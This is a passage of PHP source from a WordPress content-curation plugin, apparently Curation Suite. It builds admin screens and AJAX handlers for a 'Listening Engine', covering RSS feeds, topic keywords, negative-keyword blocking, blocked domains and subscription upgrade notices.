        $new_feed_html .= '<br><br><p>To add a feed you must first add at least one Topic to your Listening Engine. Visit the New Topic tab and either add a blank Topic or search for a Master Topic.</p>';
    } else {
        $new_feed_html .= '<h2>Add New Feed ' . cs_html_get_tutorial_link('Nv0CWVtVZI8', 'New Feed Tutorial') . '</h2>
		<p>Total Feeds/Sites: <span class="current_total_feeds">' . $rss_total . '</span> of ' . $platform['feed_limit'] . '</p>
		<div id="feed_return_message"></div>
		<div class="listing_form_element">' . $topic_dd_html . '</div>
        <div class="listing_form_element">
            <label>Site/URL:</label>
            <input type="text" name="url" value="" id="url" class="regular-text form-control" />
            <a href="javascript:;" class="load_url_for_feeds button action" rel="url_sources_body">Find Feed</a> <a href="javascript:;" class="clear_element clear_feed_elements" name="both_names"><i class="fa fa-eraser"></i> clear</a>
        </div>
        <div class="listing_form_element">
            <label>Title:</label>
            <input type="text" name="feed_title" value="" id="feed_title" class="regular-text form-control" />
        </div>
        <div class="listing_form_element">
            <label>Feed URL:</label>
            <input type="text" name="feed_url" value="" id="feed_url" class="regular-text form-control" />
			<a href="javascript:;" class="add_feed_source button-primary action" rel="url_sources_body">Add New Feed</a> <a href="javascript:;" class="check_selected_feed_now">check feed</a>
        </div>
        <div>
        <p>Feed Results:</p>
			<div style="float: left;">
            <ul id="feeds" style="overflow: hidden; display: block;" class="feed_lists">
			<li><i>Enter site or URL and click Find Feed to see possible feed results.</i></li>
            </ul>
            </div>
            <div id="feed_on_demand_results">
                Load feed for results.
            </div>
        </div>';
    }
    $new_feed_html .= '</div>';


    $negative_keyword_html = '<div id="negative_keywords">
	<h2 class="notice_red"><i class="fa fa-search-minus"></i> Narratives & Negative Keywords ' . cs_html_get_tutorial_link('RBKRwBI0hT8', 'Negative Keywords Tutorial') . '</h2>
	<p>Negative Keywords & Narrative Blocks are search terms that if found in content within you Listening Engine will be automatically blocked. Please
	<a href="http://curationsuite.com/tutorial/negative-keywords" target="_blank">watch this short video tutorial</a> before you use this advanced feature.</p>
	';

    $form_options = array('title' => 'Title', 'snippet' => 'Snippet/Body', 'all' => 'All');
    $select_html = '<select id="le_negative_keyword_search_type" name="le_negative_keyword_search_type" class="cu_mid_opt">';
    foreach ($form_options as $key => $value) {
        $select_html .= '<option class="' . $key . '" value="' . $key . '">' . $value . '</option>';
    }
    $select_html .= '</select>';

    $negative_keyword_html .= '<div id="negative_keyword_entry_elems"><input type="text" class="" id="input_negative_keyword_search_term" />' . $select_html . '<a href="javascript:;" class="cs_le_negative_keyword_btn button-primary action" data-action-type="add" data-parameter-id="0">Add</a></div>';
    $negative_keyword_html .= '<div id="negative_keyword_wrap">' . cs_le_html_negative_keyword_table_results($return_data['results']['negative_keywords']) . '</div>';


    $tabs_html .= '<li><a href="#le_help_tab"><i class="fa fa-info-circle"></i> Help/Tutorials</a></li>';
    $help_section_html = '<div id="le_help_tab"><ul>';
    $help_section_html .= '<h3>Setting Up and Overview</h3>';
    $help_section_html .= '<li><a href="javascript:;" id="XPEjkWIp_1k" class="cs_tutorial_popup" title=""><i class="fa fa-video-camera"></i> Example Listening Engine</a> - Example of a quality Listening Engine</li>';
    $help_section_html .= '<h3>Topics</h3>';
    $help_section_html .= '<li><a href="javascript:;" id="mfH4LusBfgU" class="cs_tutorial_popup"><i class="fa fa-video-camera"></i> Creating Topics Overview</a> - Learn how to create a highly effective topic for content discovery.</li>';
    $help_section_html .= '<li><a href="javascript:;" id="OEbYHuOIFNE" class="cs_tutorial_popup"><i class="fa fa-video-camera"></i> Adding Blank Topics</a> - How to add and edit a Blank Topic</li>';
    $help_section_html .= '<li><a href="javascript:;" id="qSrYgmGS4jE" class="cs_tutorial_popup"><i class="fa fa-video-camera"></i> Adding Master Topics</a> - The quickest way to get started is by adding master topics.</li>';

    $help_section_html .= '<h3>Keywords</h3>';
    $help_section_html .= '<li><a href="javascript:;" id="iBiBdvcqGrQ" class="cs_tutorial_popup"><i class="fa fa-video-camera"></i> Adding Keywords Tutorial</a> - Learn how you can easily add keywords Listening Engine</li>';
    $help_section_html .= '<h3>Feeds</h3>';
    $help_section_html .= '<li><a href="javascript:;" id="Nv0CWVtVZI8" class="cs_tutorial_popup"><i class="fa fa-video-camera"></i> Adding Feeds Tutorial</a> - Learn how you can easily add RSS feeds to your Listening Engine</li>';
    $help_section_html .= '<li><a href="javascript:;" id="CJi7TQRa1kU" class="cs_tutorial_popup"><i class="fa fa-video-camera"></i> Editing Feeds Tutorial</a> - This tutorial covers how you can edit feeds in your Listening Engine</li>';
    $help_section_html .= '<h3>Negative Keywords</h3>';
    $help_section_html .= '<li><a href="javascript:;" id="RBKRwBI0hT8" class="cs_tutorial_popup"><i class="fa fa-video-camera"></i> Negative Keywords Tutorial</a> - Learn how to use the advanced content blocking feature of negative keywords</li>';
    $help_section_html .= '</<ul></div>';

    $tabs_html .= '<li><a href="#le_upgrade_tab"><i class="fa fa-info-circle"></i> Upgrades</a></li>';
    $upgrade_section_html = '<div id="le_upgrade_tab">';

    $upgrade_section_html .= '<div><p>This platform is <strong class="current_platform_name">' . $PlatformLevel['level_name'] . ' Level Listening Platform</strong> a with <strong>' . $platform['topic_limit'] . ' topic limit</strong> and a <strong>' . $platform['keyword_limit'] . ' keyword limit</strong> and a <strong>' . $platform['feed_limit'] . ' website/feed limit</strong>.</p></div>
	<div>';
    if ($show_limit_notice) {
        $upgrade_section_html .= '<p><i>Please note: If your platform currently has more topics/keywords/feeds than your subscription limit then you\'re platform was setup before our self management was released.
You are free to edit or modify your Listening Engine within the limitations of your current subscription level. If you are over the keyword or feed limit in order to add or modify your topics you\'ll have to remove unwanted keywords or feeds.
You can also upgrade to a larger Listening Engine subscription plan listed below.</i></p>';
    }

    $upgrade_section_html .= '<hr />
<h3>Upgrade to an Advanced Platform</h3>';
    $upgrade_section_html .= '
<p>The Advanced Platform Level gives you access to have a total of up to 10 topics, 40 total keywords, and up to 120 websites/feeds. Upgrading is easy and is only requires a change in your subscription fee.</p>
<p>Upgrade to Advanced Listening Engine Platform: <a href="http://curationsuite.com/buy/upgrade-standard-le-monthly" target="_blank" class="cs_action_link">Monthly</a> | <a href="http://curationsuite.com/buy/upgrade-standard-le-yearly" target="_blank" class="cs_action_link">Yearly</a> </p>
<hr />
<h3>Beyond Advanced Platforms</h3>
<p>Any Listening Engine above Advanced is a custom Listening Engine and requires a custom price quote. Custom Listening Engines can have up to 40 Topics and custom Keyword and Website/Feed limits. To recieve a custom Listening Engine quote please email us at <a href="mailto:team@curationsuite.com">team@curationsuite.com</a></p>
<hr />
<h3>Setup Consultation</h3>
<p>For expert help you can schedule a Listening Engine setup consultation with one of our discovery experts.</p>
<p>Our consulting sessions are designed to quickly provide answers to the exact keywords, websites, and topic arrangement you need to create a highly effective content discovery platform -- no matter how big or small your market or niche.</p>
<p><a href="http://curationsuite.com/buy/le-setup-consultation" target="_blank">Click here to purchase and schedule a consulting session.</a></p>
<hr />
<h3>Add Real Time</h3>
<p>All Listening Engine Platforms have a guarantee content pull (both keywords and feeds) of at least 2 times within 24 hour period. Social and other trust data are consistently being pulled/updated on content within your Listening Engine as well.</p>
<p>If you require a more real time content discovery outlook for your platform you can upgrade to our Real Time Addition. Our real time option has a guarantee keyword/feed pull on an hourly basis. There is an additional subscription fee of $29.99/month required to add the real time addition to any platform.</p>
<p>To add the Real Time Option to your Listening Engine please email us at <a href="mailto:team@curationsuite.com" class="cs_action_link">team@curationsuite.com</a></p>
<hr />
<h3>Order An Additional Listening Engine' . cs_html_get_tutorial_link('w71yCP0pEXU', 'Why Multiple Listening Engines?') . '</h3>
<p>Want to discover content on another market or niche? You can easily add an additional Listening Engine for a $25 provisioning fee plus either the monthly or yearly subscription fee.</p>
<p>Add an additional Listening Engine Platform: <a href="http://curationsuite.com/buy/one-standard-le-platform-monthly" target="_blank" class="cs_action_link">monthly</a> | <a href="http://curationsuite.com/buy/one-standard-le-platform-yearly" target="_blank" class="cs_action_link">yearly</a> </p>
</div>

';

    $upgrade_section_html .= '</div>';

    $html .= $tabs_html . '</ul>' . $new_feed_html . $over_view_html . $topic_html . $help_section_html . $upgrade_section_html . $new_topic_html;
    $html .= $negative_keyword_html;
    $html .= '</div>';

    echo json_encode(array('status' => $status, 'results' => $html, 'message' => $message));
    die();
}

add_action('wp_ajax_cs_le_load_platform_setup', 'cs_le_load_platform_setup');


function cs_le_html_get_feed_add_html()
{

}

/**
 * @param $topic
 * @return string
 */
function cs_le_html_get_topic_detail($topic)
{
    $platform_topic_name = $topic['platform_topic_name'];
    $name = '';
    if ($platform_topic_name)
        $name = $platform_topic_name . ' (' . $topic['name'] . ')';
    else
        $name = $topic['name'];


    $topic_html = '<div class="topic_tutorial_links"><a href="javascript:;" class="show_topic_tutorials" style="float: right;"><i class="fa fa-info-circle"></i> Topic Tutorials <i class="fa fa-angle-down"></i></a><br>
		<div class="listening_topic_tutorials"><p style="padding-top: 10px;">' .
        cs_html_get_tutorial_link('mfH4LusBfgU', 'Creating Topics Tutorial', '', false) . '</p><p>' .
        cs_html_get_tutorial_link('iBiBdvcqGrQ', 'Adding/Editing Article Keywords Tutorial', '', false) . '</p><p>' .
        cs_html_get_tutorial_link('fdhEDlKhsMc', 'Adding/Editing Video Keywords', '', false) . '</p><p>' .
        cs_html_get_tutorial_link('CJi7TQRa1kU', 'Editing Feeds Tutorial', '', false) .
        '</p></div></div>';

    $topic_lock_text = '';
    if ($topic['is_locked']) {
        $date = new DateTime($topic['lock_expire_at']);
        $lock_date = $date->format('m/d/Y');
        $topic_lock_text = '<span class="cs_bad">locked until: ' . $lock_date . '</span>';
    } else {
        $Link = new ybi\html\Link('delete_topic_link_' . $topic['id'], array('delete_topic_link','cs_button','red'), array(), array('data-topic-id' => $topic['id']), '', '<i class="fa fa-minus-circle"></i> delete topic');
        $topic_lock_text = $Link->getJavaScriptLink();
    }

    $topic_html .= '<div id="topic_name_' . $topic['id'] . '" class="topic_title_row">
	<span class="topic_delete_link_w">' . $topic_lock_text . '</span>';

    $Link = new ybi\html\Link('edit_topic_link_' . $topic['id'], array('edit_topic_name_link'), array(), array('data-topic-id' => $topic['id']), '', '<i class="fa fa-pencil-square-o"></i>edit name');
    $topic_html .= '<h2><span class="topic_name_title_' . $topic['id'] . '">' . $name . '</span><span class="edit_topic_link_w">' . $Link->getJavaScriptLink() . '</span></h2></div>
	<div id="topic_' . $topic['id'] . '_message"></div>';
    //$html .= $topic['id'];
    $parent_topic_id = 0;

    $keywords_arr = $topic['keywords'];
    $keyword_count = 0;
    if (is_array($keywords_arr)) {
        uasort($keywords_arr, 'cs_compare_keyword_keyword');
        $keyword_count = count($keywords_arr);
    }
    //$topic_html .= '<h3><i class="fa fa-text-width"></i> ' . $keyword_count . ' Keywords '.cs_html_get_tutorial_link('RBKRwBI0hT8','Keywords Tutorial').'</h3>';
    //	<select id="keyword_type_id" name="keyword_type_id"><option value="article">Article</option></select>
    $topic_html .= '<h3><i class="fa fa-text-width"></i> <span class="topic_' . $topic['id'] . '_keyword_count">' . $keyword_count . '</span> Keywords</h3>';
    $topic_html .= '<div id="keyword_entry_elems">
	<span style="display: inline-block;" id="keyword_entry_inputs"><label>keyword:</label><input type="text" class="keyword_add_element" id="keyword_add_keyword_' . $topic['id'] . '" /></span>
	<span style="display: inline-block;" id="keyword_entry_inputs"><label>search term (optional):</label><input type="text" class="keyword_add_element" id="search_term_' . $topic['id'] . '" /></span>
	<label class="search_types"><input type="checkbox" id="search_term_article_' . $topic['id'] . '" value=""> Article</label>
	<label class="search_types"><input type="checkbox" id="search_term_video_' . $topic['id'] . '" value=""> Video</label>
	
	
	<a href="javascript:;" class="cs_le_keyword_btn button-primary action" data-action-type="add" data-parameter-id="0" data-topic-id="' . $topic['id'] . '">Add</a>
	</div>';
    $topic_html .= '<div id="topic_' . $topic['id'] . '_keywords_results">' . cs_le_html_get_keyword_table($topic['id'], $keywords_arr) . '</div>';

    $rss_source_arr = $topic['RssSources'];
    $rss_count = count($rss_source_arr);

    $topic_html .= '<h3><i class="fa fa-rss-square"></i> <span class="topic_' . $topic['id'] . '_feed_count">' . $rss_count . '</span> Feeds/Sites</h3>';
    $topic_html .= '<div id="topic_' . $topic['id'] . '_feed_results">' . cs_le_html_get_rss_feed_table($topic['id'], $rss_source_arr) . '</div>';
    return $topic_html;
}

/**
 * Returns a full formed HTML table based on keywords and topic id passed to it. This is a function because it is used in multiple places to load keywords for a platform
 *
 * @param int $topic_id
 * @param array $keywords_arr
 * @return string
 */
function cs_le_html_get_keyword_table($topic_id, $keywords_arr)
{
    $Table = new ybi\html\Table(
        'topic_' . $topic_id . '_keywords_tbl',
        array('wp-list-table', 'widefat', 'fixed posts'),
        array('alternate' => true, 'tbody_class' => 'negative_keywords'));
    $Row = new ybi\html\Row('', array());
    $Column = new ybi\html\Column('keyword', array());
    $Column->setContent('Keyword');
    $Row->addColumn($Column);

    $Column = new ybi\html\Column('search_term', array('center'));
    $Column->setContent('Search Term');
    $Row->addColumn($Column);

    $Column = new ybi\html\Column('search_types', array('center'));
    $Column->setContent('Search Types');
    $Row->addColumn($Column);


    $Column = new ybi\html\Column('blocked_source_action', array());
    $Column->setContent('Actions');
    $Row->addColumn($Column);
    $Table->setTitleRow($Row);
    $i = 0;
    if (is_array($keywords_arr)) {
        foreach ($keywords_arr as $keyword) {
            $search_term_html = '';
            if ($keyword['search_term'] != '')
                $search_term_html = stripcslashes($keyword['search_term']);

            //$topic_html .= '<p>'.stripcslashes($keyword['keyword']) . $search_term_html .'</p>';

            $Row = new ybi\html\Row('keyword_row_topic_' . $topic_id . '_keyword_' . $keyword['id'], array('le_keyword_row'));
            $Row->addColumnContent(stripcslashes($keyword['keyword']), 'topic_' . $topic_id . '_keyword_no_' . $keyword['id']);
            $Row->addColumnContent($search_term_html, 'topic_' . $topic_id . '_keyword_search_term_no_' . $keyword['id']);
            $content_type_html = '';
            if (array_key_exists('content_types', $keyword)) {
                $ContentTypes = $keyword['content_types'];
                if (is_array($ContentTypes)) {
                    foreach ($ContentTypes as $ContentType) {
                        if ($content_type_html != '')
                            $content_type_html .= ', ';

                        $content_type_html .= $ContentType['type_name'];
                    }
                }

            }
            $Row->addColumnContent($content_type_html, 'topic_' . $topic_id . '_keyword_search_types_no_' . $keyword['id']);

            if ($keyword['is_locked']) {
                $date = new DateTime($keyword['lock_expire_at']);
                $lock_date = $date->format('m/d/Y');
                $Row->addColumnContentCenter('locked until: ' . $lock_date);
            } else {
                $DeleteLink = new ybi\html\Link('', array('cs_le_keyword_delete_link', 'cs_delete_link', 'cs_bad'), array(), array('data-parameter-id' => $keyword['id'], 'data-action-type' => 'delete', 'data-topic-id' => $topic_id), 'href', 'delete');
                $UpdateLink = new ybi\html\Link('', array('cs_le_keyword_update_link','cs_update_link'), array(), array('data-parameter-id' => $keyword['id'], 'data-action-type' => 'update', 'data-topic-id' => $topic_id), 'href', 'update');
                $Row->addColumnContentCenter($UpdateLink->getJavaScriptLink() . ' | ' . $DeleteLink->getJavaScriptLink());
            }
            $Table->addRow($Row);
            $i++;
        }
    }
    if ($i == 0) {
        $Row = new ybi\html\Row('keyword_row_no_keywords');
        $Row->addColumnContentCenter('No keywords on this topic', '', array(), array('colspan' => 3));
        $Table->addRow($Row);
    }

    return $Table->getFullTableHTML();
}

/**
 * @param int $topic_id the topic id
 * @param array $rss_source_arr array of rss_source objects
 * @return string full html table
 */
function cs_le_html_get_rss_feed_table($topic_id, $rss_source_arr)
{
    $Table = new ybi\html\Table(
        'keywords_tbl',
        array('wp-list-table', 'widefat', 'fixed posts'),
        array('alternate' => true, 'tbody_class' => 'negative_keywords'));
    $Row = new ybi\html\Row('', array());
    $Column = new ybi\html\Column('feed_title', array());
    $Column->setContent('Feed Title & Site Link');
    $Row->addColumn($Column);

    $Column = new ybi\html\Column('feed', array('center'));
    $Column->setContent('Feed');
    $Row->addColumn($Column);

    $Column = new ybi\html\Column('blocked_source_action', array());
    $Column->setContent('Actions');
    $Row->addColumn($Column);
    $Table->setTitleRow($Row);
    $i = 0;
    if (is_array($rss_source_arr)) {
        foreach ($rss_source_arr as $rssFeed) {
            //$topic_html .= '<li>' . $rssFeed['name'] . ' - ' . ybi_create_link($rssFeed['display_url'],$rssFeed['display_url']) . ' <i>feed:</i> ' . ybi_create_link($rssFeed['feed_url'],$rssFeed['feed_url']).'</li>';
            //$topic_html .= '<p>' . ybi_create_link($rssFeed['display_url'],$rssFeed['name']) . ' <i> - </i> ' . ybi_create_link($rssFeed['feed_url'],'feed').'</p>';

            $Row = new ybi\html\Row('feed_row_topic_' . $topic_id . '_feed_' . $rssFeed['id']);
            $Row->addColumnContent(ybi_create_link($rssFeed['display_url'], $rssFeed['name']), 'topic_' . $topic_id . '_feed_no_' . $rssFeed['id']);
            $Row->addColumnContent(ybi_create_link($rssFeed['feed_url'], $rssFeed['feed_url']), 'topic_feed_' . $rssFeed['id']);
            $DeleteLink = new ybi\html\Link('', array('cs_le_feed_delete_link', 'cs_delete_link', 'cs_bad'), array(), array('data-parameter-id' => $rssFeed['id'], 'data-action-type' => 'delete', 'data-topic-id' => $topic_id), 'href', 'delete');
            //$UpdateLink = new ybi\html\Link('',array('cs_le_negative_keyword_update_link'), array(), array('data-parameter-id'=>$rssFeed['id']),'href','update');
            $Row->addColumnContentCenter($DeleteLink->getJavaScriptLink());
            $Table->addRow($Row);
            $i++;
        }
    }
    if ($i == 0) {
        $Row = new ybi\html\Row('feeds_row_no_keywords');
        $Row->addColumnContentCenter('No websites/feeds on this topic. To add a feed go to New Feed tab.', '', array(), array('colspan' => 3));
        $Table->addRow($Row);
    }
    return $Table->getFullTableHTML();
}


function cs_le_check_feed_url_return_text()
{

    $url = trim($_POST['url']);
    $html = '';
    $html = cs_check_and_get_feed_text($url);
    $feed_html = cs_parse_feed_return_results($url);

    echo json_encode(array('html' => $html, 'feed_html' => $feed_html, 'url' => $url));
    die();

}

add_action('wp_ajax_cs_le_check_feed_url_return_text', 'cs_le_check_feed_url_return_text');

function cs_check_and_get_feed_text($feed_url)
{
    include_once(ABSPATH . WPINC . '/feed.php');
    $good_feed_text = ' - <span class="good">Passed Feed Check</span>';
    $feedArr = array($feed_url);
    $rss = fetch_feed($feedArr);
    //$rss->set_cache_duration(0);

    if (is_wp_error($rss)) {
        $good_feed_text = ' - <span class="bad">Failed Check</span>';
    }
    return $good_feed_text;
}

function cs_parse_feed_return_results($feed_url)
{

    include_once(ABSPATH . WPINC . '/feed.php');
    //$html = '<li>'.$feed_url.'</li>';
    $html = '';
    $feedArr = array($feed_url);
    $rss = fetch_feed($feedArr);
    //$rss->set_cache_duration(0);

    if (!is_wp_error($rss)) {

        $maxitems = $rss->get_item_quantity(5);
        // Build an array of all the items, starting with element 0 (first element).
        $rss_items = $rss->get_items(0, $maxitems);
        $title = '';
        foreach ($rss_items as $item) :
            $title = $item->get_title();
            $current_url = $item->get_permalink();
            $pubDate = $item->get_date();
            $detailsDate = '';
            if ($pubDate) {
                $date = new DateTime($pubDate);
                $detailsDate = $date->format('m-d-Y h-i-s'); // this is used in the details string, we need it to have no spaces
            }
            $html .= '<li><a href="' . $current_url . '" target="_blank">' . $title . '</a> on ' . $detailsDate . '</li>';
        endforeach;
    } else {

        $html = '<li class="bad">Feed is not good</li>';

    }
    return $html;

}

function cs_le_load_negative_keywords()
{
    $platform_id = trim($_POST['platform_id']);
    $send_data = array('platform_id' => $platform_id);
    $parm_url_arr = array($platform_id, 'list');
    $return_data = ybi_curation_suite_api_call('platform/negative-keyword', $send_data, $parm_url_arr);
    $html = cs_le_html_negative_keyword_table_results($return_data['results']);
    $status = 'success';
    echo json_encode(array('status' => $status, 'results' => $html, 'message' => $message));
    die();
}

add_action('wp_ajax_cs_le_load_negative_keywords', 'cs_le_load_negative_keywords');

function cs_le_negative_keyword_action()
{
    $message = '';
    $status = '';
    $platform_id = trim($_POST['platform_id']);
    $keyword_search_term = trim($_POST['keyword_search_term']);
    $search_type = trim($_POST['search_type']);
    $current_action = trim($_POST['current_action']);
    $parameter_id = trim($_POST['parameter_id']);
    $send_data = array(
        'keyword' => $keyword_search_term,
        'search_type' => $search_type,
        'negative_keyword_id' => $parameter_id
    );
    $param_url_arr = array($platform_id, $current_action);
    $return_data = ybi_curation_suite_api_call('platform/negative-keyword', $send_data, $param_url_arr);
    if ($return_data['status'] == 'success') {
        $status = 'success';
        $message = $return_data['message'];
    }
    echo json_encode(array('status' => $status, 'message' => $message));
    die();

}
add_action('wp_ajax_cs_le_negative_keyword_action', 'cs_le_negative_keyword_action');

function cs_le_html_negative_keyword_table_results($negative_keyword_results_arr)
{

    $Table = new ybi\html\Table(
        'negative_keywords_tbl',
        array('wp-list-table', 'widefat', 'fixed posts'),
        array('alternate' => true, 'tbody_class' => 'negative_keywords'));
    $Row = new ybi\html\Row('', array());
    $Column = new ybi\html\Column('blocked_source_head', array());
    $Column->setContent('Term');
    $Row->addColumn($Column);

    $Column = new ybi\html\Column('date_data_head', array('center'));
    $Column->setContent('Added');
    $Row->addColumn($Column);

    $Column = new ybi\html\Column('', array('center'));
    $Column->setContent('Type');
    $Row->addColumn($Column);

    $Column = new ybi\html\Column('', array('center'));
    $Column->setContent('Search Type');
    $Row->addColumn($Column);

    $Column = new ybi\html\Column('date_data_head', array('center'));
    $Column->setContent('Expire Date');
    $Row->addColumn($Column);

    $Column = new ybi\html\Column('date_data_head', array('center'));
    $Column->setContent('Total Blocked');
    $Row->addColumn($Column);

    $Column = new ybi\html\Column('blocked_source_action', array());
    $Column->setContent('Actions');
    $Row->addColumn($Column);
    $Table->setTitleRow($Row);

    if (count($negative_keyword_results_arr) > 0) {
        $total_blocked = 0;
        //$negative_keyword_html .= '';
        foreach ($negative_keyword_results_arr as $NegativeKeyword) {
            //$negative_keyword_html .= '<p><i>' . $NegativeKeyword['keyword'] . '</i> <strong>Type:</strong> ' . $NegativeKeyword['search_type'] . ' <i>blocked: </i>' . $NegativeKeyword['block_count_total'] . '</p>';
            $total_blocked += $NegativeKeyword['block_count_total'];

            $Row = new ybi\html\Row('negative_keyword_row_' . $NegativeKeyword['id']);
            $Row->addColumnContent($NegativeKeyword['keyword'], 'negative_keyword_search_term_no_' . $NegativeKeyword['id']);

            $date = new DateTime($NegativeKeyword['entered_at']);
            if($date) {
                $added_at_text = $date->format('m/d/Y');
            } else {
                $added_at_text = '-';
            }

            $Row->addColumnContentCenter($added_at_text);

            if($NegativeKeyword['is_narrative']==1) {
                $narrative_block_strength = '';
                if($NegativeKeyword['search_type']=='title') {
                    $narrative_block_strength = 'weak';
                } else {
                    $narrative_block_strength = 'strong';
                }
                $Row->addColumnContentCenter('narrative block');
                $Row->addColumnContentCenter($narrative_block_strength, 'negative_keyword_search_type_no_' . $NegativeKeyword['id']);
            } else {
                $Row->addColumnContentCenter('keyword');
                $Row->addColumnContentCenter($NegativeKeyword['search_type'], 'negative_keyword_search_type_no_' . $NegativeKeyword['id']);
            }


            $expire_at_text ='-';
            if($NegativeKeyword['expire_at'] != '') {
                //$expire_at_text
                $date = new DateTime($NegativeKeyword['expire_at']);
                $expire_at_text = $date->format('m/d/Y');
            }
            $Row->addColumnContentCenter($expire_at_text);
            $Row->addColumnContentCenter(number_format($NegativeKeyword['block_count_total']));
            $DeleteLink = new ybi\html\Link('', array('cs_le_negative_keyword_delete_link', 'notice_red'), array(), array('data-parameter-id' => $NegativeKeyword['id'], 'data-action-type' => 'delete'), 'href', 'delete');
            $UpdateLink = new ybi\html\Link('', array('cs_le_negative_keyword_update_link'), array(), array('data-parameter-id' => $NegativeKeyword['id']), 'href', 'update');
            if($NegativeKeyword['is_narrative']==1) {
                // we don't allow updates on narrative blocks
                $Row->addColumnContentCenter($DeleteLink->getJavaScriptLink());
            } else {
                $Row->addColumnContentCenter($UpdateLink->getJavaScriptLink() . ' | ' . $DeleteLink->getJavaScriptLink());
            }


            $Table->addRow($Row);
        }

        $Row = new ybi\html\Row('', array());
        $Column = new ybi\html\Column('', array('le_total'), array('colspan' => 5));
        $Column->setColSpan(2);
        $Column->setContent('Total Blocked:');
        $Row->addColumn($Column);

        $Column = new ybi\html\Column('', array('center', 'le_total'), array());
        $Column->setContent(number_format($total_blocked));
        $Row->addColumn($Column);

        $Column = new ybi\html\Column('', array('center'), array());
        $Column->setContent('');
        $Row->addColumn($Column);
        $Table->addRow($Row);

        //$negative_keyword_html .= '<p>Total Blocked ' . $total_blocked . '</p>';
    } else {
        $Row = new ybi\html\Row('', array());
        $Column = new ybi\html\Column('', array('le_total'), array('colspan' => 7));
        $Column->setContent('You have no Negative Keywords on this platform. Please watch tutorial before adding Negative Keywords.');
        $Row->addColumn($Column);
        $Table->addRow($Row);
    }
    return $Table->getFullTableHTML();
}

/**
 * This loads the Platform Control content
 * Right now it's only shows block sources but it's a general function because we might add new sub parameters here
 *
 * @since 1.41
 *
 * @return array json_encode response with html string that contains the platform control items
 */
function ybi_curation_suite_platform_control_load()
{
    $platform_id = trim($_POST['platform_id']);
    $sub_platform_control_item = trim($_POST['sub_platform_control_item']);
    $cu_date_sort = trim($_POST['cu_date_sort']);
    $cu_current_display_page = trim($_POST['cu_current_display_page']);
    $current_page = trim($_POST['current_page']);
    $start = trim($_POST['start']);
    $status =
    $html = '';
    // TESTING
    //$html .= 'platform_id: ' . $platform_id . '$sub_platform_control_item: ' . $sub_platform_control_item . '$cu_current_display_page: ' . $cu_current_display_page . '$current_page: ' . $current_page;

    $limit = 10;
    $start = ybi_get_page_start_offset($start, $limit); // sets the proper settings for start that we send to the api
    $send_data = array('start' => $start, 'limit' => $limit, 'sort' => $cu_date_sort); // must send the start, limit, and sorting
    $parm_url_arr = array('platform-control', $platform_id, $sub_platform_control_item);
    $data = ybi_curation_suite_api_call('', $send_data, $parm_url_arr);
    $Platform = $data['platform'];
    $blocked_domains = $Platform['blocked_domains'];

    $Table = new ybi\html\Table(
        'table_id',
        array('wp-list-table', 'widefat', 'fixed posts'),
        array('alternate' => true, 'tbody_class' => 'body_items'));
    $Row = new ybi\html\Row('', array());
    $Column = new ybi\html\Column('blocked_source_head', array());
    $Column->setContent('Blocked Source (Domain Name)');
    $Row->addColumn($Column);

    $Column = new ybi\html\Column('date_data_head', array());
    $Column->setContent('Block Date');
    $Row->addColumn($Column);

    $Column = new ybi\html\Column('date_data_head', array());
    $Column->setContent('Block Expire Date');
    $Row->addColumn($Column);

    $Column = new ybi\html\Column('blocked_source_action', array());
    $Column->setContent('Actions');
    $Row->addColumn($Column);
    $Table->setTitleRow($Row);

    foreach ($blocked_domains as $DomainData) {
        //$html .= 'id' . $DomainData['data']['id'];
        $Row = new ybi\html\Row('', array('type-post', 'status-publish', 'format-standard', 'hentry', 'source_' . $DomainData['data']['id']));

        $Row->addColumnContent($DomainData['data']['domain_name']);

        $date = new DateTime($DomainData['data']['entry_ts']);
        $block_date = $date->format('m/d/Y');
        $Row->addColumnContent($block_date);

        $block_expire_text = 'permanent';
        if (isset($DomainData['data']['expire_at'])) {
            $date = new DateTime($DomainData['data']['expire_at']);
            $block_expire_text = $date->format('m/d/Y');
        }
        $Row->addColumnContent($block_expire_text);

        $Column = new ybi\html\Column('', array('source_block_action_col'), array());
        $Column->setContent('<a href="javascript:;" class="cu_platform_action remove_red" cur_action="remove" type="ignore-source" parameter_id="' . $DomainData['data']['id'] . '"><i class="fa fa-minus-square"></i> unblock</a>');
        $Row->addColumn($Column);
        $Table->addRow($Row);
    }
    if ($Table->getRowCount() <= 0) {
        $Row = new ybi\html\Row('', array('type-post', 'status-publish', 'format-standard', 'hentry'));
        $Column = new ybi\html\Column('', array(), array('colspan' => 3));
        $Column->setContent('There are no blocked sources in this Listening Engine Platform.');
        $Row->addColumn($Column);
        $Table->addRow($Row);
    }

    $html .= '<div class="platform_help_message"><p>This page lists the source domains you have chosen to block within this Listening Engine PLatform. Clicking unblock will remove the
                selected domain from your blocked sources and means you will see content from this source again.</p></div>';
    $html .= $Table->getFullTableHTML();

    echo json_encode(array('status' => $status, 'results' => $html, 'message' => 'Setting has been updated'));
    die();
}

add_action('wp_ajax_ybi_curation_suite_platform_control_load', 'ybi_curation_suite_platform_control_load');
/**
 * This function handles all the historical platform content. It's basically just passing the vars in the drop down to the api call and
 * then getting back the results and displaying. This handles the ignored_content, curated_content, and shared_content actions.
 *
 * Returns JSON
 *
 * @since 1.41
 *
 * @return array json_encoded array
 */
function ybi_curation_suite_platform_history_content_load()
{
    $platform_id = trim($_POST['platform_id']);
    //if(sub_platform_control_item == 'curated_content' || sub_platform_control_item == 'shared_content' || sub_platform_control_item == 'ignored_content')
    $sub_platform_control_item = trim($_POST['sub_platform_control_item']);
    $cu_date_sort = trim($_POST['cu_date_sort']);
    $cu_current_display_page = trim($_POST['cu_current_display_page']);
    $start = trim($_POST['start']);
    $current_page = $start; // this is the rel attribute which is the page, but we are going to modify it down below
    $limit = 20;
    $start = ybi_get_page_start_offset($start, $limit);
    $html = '';
    // TESTING
    //$html .= 'platform_id: ' . $platform_id . '$sub_platform_control_item: ' . $sub_platform_control_item . '$cu_current_display_page: ' . $cu_current_display_page . '$current_page: ' . $current_page;
    $send_data = array('start' => $start, 'limit' => $limit, 'sort' => $cu_date_sort);
    $parm_url_arr = array('platform-content-history', $platform_id, $sub_platform_control_item);
    $data = ybi_curation_suite_api_call('', $send_data, $parm_url_arr);
    //$html .= $data['url'];
    $Platform = $data['platform'];
    $results = $data['results']['results'];
    $total = $data['results']['total'];
    $results_total = $data['results_total'];

    $action_title = '';
    $date_col = '';
    //$html .= 'total:'. $total . ' start: ' .$start;
    $help_message = '';
    $show_actions = true;
    $title = '';
    $use_table = true;

    // this sets special support text and the title for the display, also tells the display if it has an actions column
    switch ($sub_platform_control_item):
        case 'ignored_content':
